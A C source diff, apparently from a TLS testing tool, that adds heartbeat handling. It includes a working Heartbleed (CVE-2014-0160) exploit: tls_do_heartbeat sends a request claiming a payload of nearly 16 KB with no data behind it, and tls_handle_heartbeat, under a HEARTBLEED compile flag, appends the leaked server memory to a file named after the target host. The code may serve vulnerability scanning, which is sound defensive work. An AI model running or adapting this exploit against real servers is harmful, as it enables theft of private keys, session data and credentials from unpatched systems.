@@ -16,6 +16,7 @@
 #include "proto.h"
 #include "x509.h"
 
+static int tls_handle_heartbeat(connection_t *);
 static int tls_handle_alert(connection_t *);
 static int tls_handle_hs_serverhello(connection_t *);
 static int tls_handle_hs_servercert(connection_t *);
@@ -78,6 +79,65 @@ static void tls_clienthello_add_ciphers(connection_t *c, buf_t *b) {
 		if(!--n)
 			break;
 	}
+}
+
+int tls_do_heartbeat(connection_t *c, ssize_t payload_length) {
+	test_t *test = (test_t *)connection_priv(c);
+	size_t i, n, rec_len_offset, pad_len;
+	unsigned char *p;
+	buf_t *b;
+
+	b = buf_alloc(5 + 16*1024);
+	if(b == NULL)
+		return -1;
+
+	/* TLS record header */
+	buf_append_u8(b, 0x18 /* Content type: Heartbeat */);
+	buf_append_u16(b, test->version);
+
+	rec_len_offset = buf_len(b);
+	buf_append_u16(b, 0 /* Record length, updated later */);
+
+	/* TLS Heartbeat message */
+	buf_append_u8(b, 0x01 /* heartbeat_request */);
+	if(payload_length >= 0) {
+		buf_append_u16(b, payload_length /* payload length */);
+		for(i = 0; i < payload_length; i++)
+			buf_append_u8(b, 0xaa ^ i);
+
+		pad_len = 16;
+	}
+	else {
+		/* CVE-2014-0160: Ignore sending actual data or padding */
+		pad_len = 0; /* RFC says minimum padding 16 bytes */
+		payload_length = 0x4000 /* TLSPlaintext.length */ - 1 - 2 /* Heartbeat header */ - pad_len;
+		buf_append_u16(b, payload_length);
+		if(0) for(i = 0; i < payload_length; i++)
+			buf_append_u8(b, 0);
+	}
+
+	for(i = 0; i < pad_len; i++)
+		buf_append_u8(b, 0x50 /* random 'P' for padding */);
+
+	/* Update record length */
+	p = buf_peek(b, rec_len_offset, 2);
+	n = buf_len(b) - 5 /* skip TLS record header */;
+	p[0] = (n >> 8) & 0xff;
+	p[1] = (n >> 0) & 0xff;
+
+	n = buf_len(b);
+	p = buf_peek(b, 0, n);
+	if(connection_write(c, p, n) < 0) {
+		fprintf(stderr, "%s Heartbeat: Failed to send data\n",
+			proto_ver(c));
+		return -1;
+	}
+
+	fprintf(stderr, "%s Heartbeat: Sent 0x%02zx/%zd bytes\n",
+		proto_ver(c), buf_len(b), buf_len(b));
+
+	buf_free(b);
+	return 0;
 }
 
 int tls_do_clienthello(connection_t *c) {
@@ -215,6 +275,7 @@ int tls_handle_header(connection_t *c) {
 	switch(test->rec_contenttype) {
 	case 0x15:
 	case 0x16:
+	case 0x18:
 		break;
 	default:
 		fprintf(stderr, "%s Header has unexpected content type\n",
@@ -250,6 +311,13 @@ int tls_handle_record(connection_t *c) {
 
 			/* Consider all alerts fatal */
 			return -1;
+		}
+
+		if(test->rec_contenttype == 0x18) {
+			if(tls_handle_heartbeat(c) < 0)
+				return -1;
+
+			break;
 		}
 
 		p = buf_peek(c->buf, 0, 4);
@@ -300,6 +368,58 @@ int tls_handle_record(connection_t *c) {
 	} while(buf_len(c->buf) > 0);
 
 	return 0;
+}
+
+static int tls_handle_heartbeat(connection_t *c) {
+	test_t *test = (test_t *)connection_priv(c);
+	unsigned char *p;
+	unsigned char heartbeat_type;
+	size_t total_len, payload_len, pad_len;
+
+	p = buf_read_next(c->buf, 3, NULL);
+	if(p == NULL)
+		return -1;
+
+	heartbeat_type = p[0];
+	payload_len = p[1] << 8 | p[2];
+	pad_len = test->rec_len - payload_len - 3;
+
+	fprintf(stderr, "%s \033[1;31;40mHeartbeat:\033[0m type=0x%02x, "
+		"payload_length=0x%04zx, padding_length=0x%04zx\n",
+		proto_ver(c), heartbeat_type, payload_len, pad_len);
+
+	/* CVE-2014-0160 sometimes breaks payload_len + pad_len calculation */
+	total_len = test->rec_len + 3;
+	p = buf_read_next(c->buf, total_len, NULL);
+	if(p == NULL) {
+		fprintf(stderr, "%s Heartbeat: failed to read %zd (payload %zd +"
+			" padding %zd) bytes data\n",
+			proto_ver(c), total_len, payload_len, pad_len);
+		return -1;
+	}
+
+#ifdef HEARTBLEED
+	{
+		char name[1024];
+		FILE *fd;
+
+		snprintf(name, sizeof(name), "%s.heartbeat", c->hostname);
+		fd = fopen(name, "a");
+		if(fd) {
+			fwrite(p, 1, test->rec_len - 3, fd);
+			fclose(fd);
+		}
+	}
+#endif
+
+	buf_read_done(c->buf);
+	if(heartbeat_type == 2 && test->rec_len - 3 == payload_len + pad_len)
+		return 0;
+
+	fprintf(stderr, "%s \033[1;31;40mHeartbeat:\033[0m INVALID response\n",
+		proto_ver(c));
+
+	return -1;
 }
 
 /* https://www.iana.org/assignments/tls-parameters/tls-parameters.xhtml#tls-parameters-6 */
